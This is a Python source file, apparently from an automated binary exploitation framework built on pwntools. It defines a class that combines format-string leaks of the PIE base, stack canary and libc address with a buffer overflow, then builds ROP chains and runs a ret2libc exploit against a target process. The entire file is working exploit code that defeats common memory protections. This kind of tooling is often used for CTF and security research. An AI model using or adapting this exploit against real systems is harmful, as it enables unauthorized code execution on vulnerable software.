from binary.rop_exploiter import RopExploiter
from binary.fmt_exploiter import FmtExploiter
from pwn import *


context.log_level = 'WARN'

class FmtBofExploiter:
    def __init__(self, binary, vuln):
        self.binary = binary
        self.globals = vuln
        self.bof_exploiter = RopExploiter(self.binary, self.globals)
        self.fmt_exploiter = FmtExploiter(self.binary, self.globals)

    def trim_input(self, input, ch):
        ip = ch * self.binary.elf.bytes
        offset = input.index(ip)
        exploit_input = input[0:offset]
        return exploit_input

    def apply_exploit_input(self, proc, fmt_payload, bof_payload):
        current_output = b""
        for input in self.globals["input"]:
            current_output += proc.clean()
            if self.bof_exploiter.first_input == b"" and current_output != b"":
                self.bof_exploiter.first_input = current_output
            ip = b"X" * self.binary.elf.bytes
            fmt = b"F" * self.binary.elf.bytes
            if ip not in input and fmt not in input:
                proc.send(input)
            elif fmt in input:
                trimmed_input = self.trim_input(input, b"F")
                leak_payload = flat(
                    trimmed_input,
                    fmt_payload
                )
                proc.sendline(leak_payload)
            elif ip in input:
                elf = self.binary.elf
                if self.binary.props["adjusted_binary_base"] is False:
                    if b'|' in current_output:
                        leaked_pie = int(current_output.split(b'|')[1].rstrip(), 16)
                        base_addr = leaked_pie - self.globals["pie_offset"]
                        self.binary.adjust_binary_base(base_addr)
                        rop = ROP([elf])
                        rop.call(elf.entry)
                        bof_payload = rop.chain() if bof_payload == b"" else bof_payload
                if self.binary.protection["canary"] is True:
                    if self.globals["canary_leak"] is None and b'|' in current_output:
                        leaked_canary = int(current_output.split(b'|')[2].rstrip(), 16)
                        log.info("canary leaked: {}".format(pack(leaked_canary)))
                        self.globals["canary_leak"] = pack(leaked_canary)
                    input = input.replace(b"\x00YRANAC_", self.globals["canary_leak"])

                trimmed_input = self.trim_input(input, b"X")
                exploit_payload = flat(
                    trimmed_input,
                    bof_payload
                )
                log.info("bof payload: {}".format(exploit_payload))
                proc.sendline(exploit_payload)

        current_output += proc.clean()
        log.info("current output: {}".format(current_output))
        return current_output

    def two_stage_exploit(self):
        proc = self.binary.elf.process()
        # proc = gdb.debug(self.binary.bin_path, '''break _start''')
        bin_elf = self.binary.elf

        pie = self.binary.protection["pie"]
        canary = self.binary.protection["canary"]
        fmt_payload = b""
        bof_payload = b""
        if pie is True:
            pie_payload, pie_offset = self.fmt_exploiter.find_pie_offset()
            self.globals["pie_offset"] = pie_offset
            fmt_payload += pie_payload
        else:
            rop = ROP([bin_elf])
            rop.call(bin_elf.entry)
            bof_payload = rop.chain()
        if canary is True:
            self.globals["canary_leak"] = None
            canary_payload = self.fmt_exploiter.find_canary_offset()
            fmt_payload += canary_payload
        fmt_payload = fmt_payload.replace(b"||", b"|")

        self.apply_exploit_input(proc, fmt_payload, bof_payload)

        # find libc base
        if self.binary.props["use_leak_addr_chain"] is False:
            rop = ROP([bin_elf])
            rop.call(bin_elf.entry)
            libc_payload, libc_offset = self.fmt_exploiter.find_libc_offset()
            output = self.apply_exploit_input(proc, libc_payload, rop.chain())
            if b'|' in output:
                leaked_libc_addr = int(output.split(b'|')[1].rstrip(), 16)
                libc_base = leaked_libc_addr - libc_offset
                self.binary.set_libc_base(libc_base)

        # self.bof_exploiter.globals = self.globals
        self.bof_exploiter.ret2libc_exploit(proc)
        # self.bof_exploiter.ret2dlresolve_exploit(proc)
